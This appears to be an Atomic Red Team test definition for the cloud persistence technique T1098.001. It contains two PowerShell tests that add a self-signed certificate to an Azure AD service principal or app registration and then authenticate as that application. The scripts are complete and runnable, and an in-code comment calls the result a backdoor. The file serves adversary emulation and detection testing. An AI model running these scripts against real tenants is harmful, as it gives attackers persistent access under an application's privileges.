attack_technique: T1098.001
display_name: Additional Cloud Credentials
atomic_tests:
- name: Azure AD Application Hijacking - Service Principal
  auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
  description: |
    Add a certificate to an Application through its Service Principal.
    The certificate can then be used to authenticate as the application and benefit from its rights.
    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Azure AD username
      type: String
      default: jonh@contoso.com
    password:
      description: Azure AD password
      type: String
      default: p4sswd
    application:
      description: Targeted Application
      type: String
      default: "Application"
    certificate_password:
      description: Password of the new certificate
      type: string
      default: Passw0rd
    path_to_cert:
      description: Path of the new certificate, locally stored 
      type: string
      default: $env:TEMP
  dependency_executor_name: powershell
  dependencies:
  - description: |
      AzureAD module must be installed.
    prereq_command: |
      if (Get-Module AzureAD) {exit 0} else {exit 1}
    get_prereq_command: |
      Install-Module -Name AzureAD -Force
  executor:
    command: |
      Import-Module -Name AzureAD
      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
      Connect-AzureAD -Credential $Credential

      $sp = Get-AzureADServicePrincipal -Searchstring "#{application}"
      if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
      # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
      $certNotAfter = (Get-Date).AddDays(2)
      $credNotAfter = (Get-Date).AddDays(1)
      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
      $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
      Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application}.pfx" -Password $pwd

      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application}.pfx", $pwd)
      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

      New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $credNotAfter

      Start-Sleep -s 15
      $tenant=Get-AzureADTenantDetail
      Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb

    cleanup_command: |
      rm "#{path_to_cert}\#{application}.pfx"
    name: powershell
    elevation_required: false

- name: Azure AD Application Hijacking - App Registration
  auto_generated_guid: a12b5531-acab-4618-a470-0dafb294a87a
  description: |
    Add a certificate to an Application through its App Registration.
    The certificate can then be used to authenticate as the application and benefit from its rights.
    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Azure AD username
      type: String
      default: "jonh@contoso.com" 
    password:
      description: Azure AD password
      type: String
      default: p4sswd
    application:
      description: Targeted Application 
      type: String
      default: "MonCul"
    certificate_password:
      description: Password of the new certificate
      type: string
      default: Passw0rd
    path_to_cert:
      description: Path of the new certificate, locally stored 
      type: string
      default: $env:TEMP
  dependency_executor_name: powershell
  dependencies:
  - description: |
      AzureAD module must be installed.
    prereq_command: |
      if (Get-Module AzureAD) {exit 0} else {exit 1}
    get_prereq_command: |
      Install-Module -Name AzureAD -Force
  executor:
    command: |
      Import-Module -Name AzureAD
      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
      Connect-AzureAD -Credential $Credential

      $app = Get-AzureADApplication -Searchstring "#{application}"
      if ($app -eq $null) { Write-Warning "Application not found"; exit }
      $certNotAfter = (Get-Date).AddDays(2)
      $credNotAfter = (Get-Date).AddDays(1)
      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\CurrentUser\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $certNotAfter).Thumbprint
      $pwd = ConvertTo-SecureString -String "#{certificate_password}" -Force -AsPlainText
      Export-PfxCertificate -cert "cert:\CurrentUser\my\$thumb" -FilePath "#{path_to_cert}\#{application}.pfx" -Password $pwd

      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate("#{path_to_cert}\#{application}.pfx", $pwd)
      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

      New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $credNotAfter

      Start-Sleep -s 15
      $tenant=Get-AzureADTenantDetail
      Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb

    cleanup_command: |
      rm "#{path_to_cert}\#{application}.pfx"
    name: powershell
    elevation_required: false
    
